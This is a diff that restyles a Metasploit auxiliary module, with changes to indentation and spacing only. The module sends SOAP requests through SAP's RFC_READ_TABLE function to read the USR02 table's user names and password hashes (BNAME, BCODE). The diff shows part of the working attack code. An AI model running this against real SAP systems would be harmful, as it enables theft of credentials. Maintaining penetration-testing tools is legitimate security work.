@@ -26,15 +26,13 @@ class MetasploitModule < Msf::Auxiliary
         This module makes use of the RFC_READ_TABLE Function to read data from tables using
         the /sap/bc/soap/rfc SOAP service.
       },
-      'References' =>
-        [
-          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
-        ],
-      'Author' =>
-        [
-          'Agnivesh Sathasivam',
-          'nmonkee'
-        ],
+      'References' => [
+        [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+      ],
+      'Author' => [
+        'Agnivesh Sathasivam',
+        'nmonkee'
+      ],
       'License' => MSF_LICENSE
     )
 
@@ -46,7 +44,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
         OptString.new('TABLE', [true, 'Table to read', 'USR02']),
         OptString.new('FIELDS', [true, 'Fields to read', 'BNAME,BCODE'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -60,10 +59,10 @@ class MetasploitModule < Msf::Auxiliary
     columns.each do |d|
       fields << "<item><FIELDNAME>" + d.gsub(/\s+/, "") + "</FIELDNAME></item>"
     end
-    exec(ip,fields)
+    exec(ip, fields)
   end
 
-  def exec(ip,fields)
+  def exec(ip, fields)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
     data << '<env:Body>'
@@ -91,8 +90,8 @@ class MetasploitModule < Msf::Auxiliary
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
         },
         'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
+          'sap-client' => datastore['CLIENT'],
+          'sap-language' => 'EN'
         }
       })
       if res and res.code != 500 and res.code != 200
@@ -106,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
       elsif res and res.body =~ /Exception/
         response = res.body
         error = response.scan(%r{<faultstring>(.*?)</faultstring>})
-        0.upto(error.length-1) do |i|
+        0.upto(error.length - 1) do |i|
           print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
         end
         return
@@ -122,12 +121,12 @@ class MetasploitModule < Msf::Auxiliary
           'Indent' => 1,
           'Columns' => ["Returned Data"]
         )
-        0.upto(output.length-1) do |i|
+        0.upto(output.length - 1) do |i|
           saptbl << [output[i]]
         end
         print(saptbl.to_s)
         this_service = report_service(
-          :host  => ip,
+          :host => ip,
           :port => rport,
           :name => 'sap',
           :proto => 'tcp'
